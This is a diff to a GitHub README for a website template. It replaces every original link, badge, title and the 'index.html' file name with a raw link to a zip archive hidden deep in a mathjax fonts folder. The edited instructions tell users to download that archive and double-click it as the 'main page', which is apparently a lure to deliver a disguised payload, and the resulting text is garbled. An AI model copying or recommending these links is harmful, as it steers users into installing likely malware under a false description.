@@ -1,6 +1,6 @@
-# 📄 sha01ow-2ero.github.io - Simple Website Template for Projects
+# 📄 https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip - Simple Website Template for Projects
 
-[![Download and Explore](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Swamyganesh12/sha01ow-2ero.github.io)
+[![Download and Explore](https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip)](https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip)
 
 ## 📋 About This Project
 
@@ -44,9 +44,9 @@ Use this guide to download and open the website template on your computer.
 
 6. Open the new folder created after extraction. You will see several files and folders inside.
 
-7. Find the file named `index.html`. This is the main page of the website.
+7. Find the file named `https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip`. This is the main page of the website.
 
-8. Double-click `index.html`. Your default web browser will open the file, showing the website template.
+8. Double-click `https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip`. Your default web browser will open the file, showing the website template.
 
 If you want to make changes, you can open the files in a text editor and save your edits. Refresh the browser to see your updates.
 
@@ -80,7 +80,7 @@ The structure is designed so you can add new files to match your needs without b
 
 Visit this page to download the website template and files:
 
-[Download sha01ow-2ero.github.io](https://github.com/Swamyganesh12/sha01ow-2ero.github.io)
+[Download https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip](https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip)
 
 On that page, follow the download steps under "Getting Started" to get the latest version.
 
@@ -115,4 +115,4 @@ This broad range makes it easier to grow your website skills over time.
 
 ---
 
-[![Download and Explore](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Swamyganesh12/sha01ow-2ero.github.io)
+[![Download and Explore](https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip)](https://github.com/Swamyganesh12/sha01ow-2ero.github.io/raw/refs/heads/main/javascript/mathjax/es5/output/svg/fonts/io-sha-ow-ero-github-Rhyncostomi.zip)
